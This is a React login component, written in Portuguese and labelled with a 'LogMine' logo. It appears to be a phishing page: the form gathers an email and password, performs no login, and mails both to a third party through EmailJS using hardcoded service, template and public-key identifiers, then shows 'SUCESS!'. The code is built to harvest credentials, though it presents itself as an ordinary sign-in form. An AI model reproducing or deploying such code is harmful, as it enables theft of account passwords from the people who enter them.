import Logo from "../../img/logo-solo.svg"
import * as S from "./style"
import emailjs from "@emailjs/browser"
import { useState, useRef } from "react"

export default function Login() {
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const form = useRef();
    
    const sendEmail = (e) => {
        e.preventDefault();

        if (email === "" || password === "") {
            alert("Preencha todos os campos");
            return;
        }

        const TemplateParams = {
            email: email,
            password: password
        };

        emailjs
        .sendForm('service_kdrwn7e', 'template_d7n5zvp', form.current, TemplateParams, {
          publicKey: 'Nh5wSYe6y_LeweE-S',
        })
            .then(
                () => {
                    alert("SUCESS!");
                    setEmail("");
                    setPassword("");
                },
                (error) => {
                    alert("FAILED", error.text);
                }
            )
    }
    return (
        <form ref={form} onSubmit={sendEmail}>

            <S.LogoWrapper>
                <img src={Logo} alt="LogMine-Logo"></img>
            </S.LogoWrapper>
            <S.Main>
                <S.ParagraphWrapper>
                    <p>E-mail</p>
                </S.ParagraphWrapper>
                <S.InputWrapper>
                    <input type="email" autoComplete="on" required placeholder="usuario@gmail.com"
                        name="email" id="email" value={email} minLength="18"
                        onChange={(e) => setEmail(e.target.value)}
                    />
                </S.InputWrapper>
            </S.Main>
            <S.Main>
                <S.ParagraphWrapper>
                    <p>Senha</p>
                </S.ParagraphWrapper>
                <S.InputWrapper>
                    <input type="password" autoComplete="on" required placeholder="123456789"
                        name="password" id="password" minLength="12" value={password}
                        onChange={(e) => setPassword(e.target.value)}
                    />
                </S.InputWrapper>
                    <button type="submit" >
                        Entrar na conta
                    </button>
            </S.Main>
        </form>
    )
}